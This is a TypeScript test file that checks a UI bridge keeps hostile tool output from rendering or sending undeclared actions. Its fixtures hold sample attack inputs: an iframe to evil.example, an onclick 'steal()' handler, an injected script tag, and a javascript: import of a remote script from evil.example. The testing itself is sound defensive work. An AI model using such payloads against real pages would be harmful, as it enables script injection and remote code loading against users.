// @spec:030-adapter-mcp-apps
// User Story 2 (P1): malicious tool output cannot escape the guardrail. Hostile
// spec content is refused, smuggled markup stays inert, only declared actions
// leave the surface, and a message without the protocol envelope never becomes
// state — all deterministic, no model in the loop.
import { beforeEach, describe, expect, it } from 'vitest';

import type { ActionMessage, BridgeRefusal } from '../src/index.js';
import { createSurfaceBridge } from '../src/index.js';

let surface: HTMLElement;

beforeEach(() => {
  document.body.replaceChildren();
  surface = document.createElement('div');
  document.body.appendChild(surface);
});

const toolResult = (spec: unknown, protocolVersion?: string) => ({
  jsonrpc: '2.0',
  method: 'ui/toolResult',
  params: { protocolVersion, surface: { spec } },
});

interface Harness {
  bridge: ReturnType<typeof createSurfaceBridge>;
  sent: ActionMessage[];
  refusals: BridgeRefusal[];
}

const harness = (): Harness => {
  const sent: ActionMessage[] = [];
  const refusals: BridgeRefusal[] = [];
  const bridge = createSurfaceBridge({
    onRefusal: (refusal) => refusals.push(refusal),
    send: (message) => sent.push(message),
    surface,
  });
  return { bridge, refusals, sent };
};

describe('the guarded renderer is the only render path', () => {
  it.each([
    {
      component: 'iframe',
      props: { src: 'https://evil.example' },
      rule: 'unknown-component',
      value: 'iframe',
    },
    {
      component: 'ki-button',
      props: { onclick: 'steal()' },
      rule: 'unknown-prop',
      slots: { '': ['Go'] },
      value: 'onclick',
    },
  ])('S4 refuses hostile spec content and renders only catalog components', (example) => {
    const { bridge, refusals } = harness();
    const spec = {
      root: {
        component: example.component,
        props: example.props,
        ...('slots' in example ? { slots: example.slots } : {}),
      },
      version: 1,
    };

    const result = bridge.receive(toolResult(spec));

    expect(result.ok).toBe(false);
    expect(
      result.refusals.some((r) => r.reason === example.rule && r.value === example.value),
    ).toBe(true);
    expect(refusals.length).toBeGreaterThan(0);
    // Nothing outside the catalog rendered (atomic fail-closed).
    expect(surface.querySelector('iframe')).toBeNull();
    expect(surface.childNodes).toHaveLength(0);
  });

  it('S5 keeps markup smuggled in result data inert', () => {
    const { bridge } = harness();
    const titleBefore = document.title;
    const spec = {
      root: { component: 'ki-card', slots: { '': ["<script>document.title='owned'</script>"] } },
      version: 1,
    };

    const result = bridge.receive(toolResult(spec));

    expect(result.ok).toBe(true);
    // The field appears as inert text; no script node, title unchanged.
    expect(surface.querySelector('script')).toBeNull();
    expect(document.title).toBe(titleBefore);
    expect(surface.querySelector('ki-card')?.textContent).toContain('<script>');
  });

  it('S6 lets only declared actions leave the surface', () => {
    const { bridge, refusals, sent } = harness();
    bridge.receive(
      toolResult({
        root: { action: 'refresh-inventory', component: 'ki-button', slots: { '': ['Refresh'] } },
        version: 1,
        actions: ['refresh-inventory'],
      }),
    );

    const undeclared = bridge.dispatch('transfer-funds');
    expect(undeclared.sent).toBe(false);
    expect(sent).toHaveLength(0);
    expect(
      refusals.some((r) => r.reason === 'undeclared-action' && r.value === 'transfer-funds'),
    ).toBe(true);

    const declared = bridge.dispatch('refresh-inventory');
    expect(declared.sent).toBe(true);
    expect(sent).toHaveLength(1);
    expect(sent[0]?.params.action).toBe('refresh-inventory');
  });

  it('S7 ignores a message without the protocol envelope, leaving state unchanged', () => {
    const { bridge } = harness();
    bridge.receive(
      toolResult({ root: { component: 'ki-card', slots: { '': ['hello'] } }, version: 1 }),
    );
    const rendered = surface.innerHTML;
    expect(surface.querySelector('ki-card')).not.toBeNull();

    const result = bridge.receive("javascript:import('https://evil.example/x.js')");

    expect(result.handled).toBe(false);
    expect(surface.innerHTML).toBe(rendered);
  });
});
